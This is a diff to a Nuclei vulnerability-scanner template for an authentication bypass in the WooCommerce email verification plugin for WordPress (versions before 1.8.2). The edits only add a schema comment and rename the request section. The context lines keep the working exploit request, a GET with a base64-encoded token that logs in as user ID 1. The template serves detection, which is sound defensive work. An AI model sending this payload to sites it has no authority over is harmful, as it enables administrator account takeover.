@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-woocommerce-email-verification
 info:
   name: WordPress WooCommerce <1.8.2 - Authentication Bypass
@@ -11,7 +12,7 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-288
   tags: wordpress,wp-plugin,woocommerce
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="
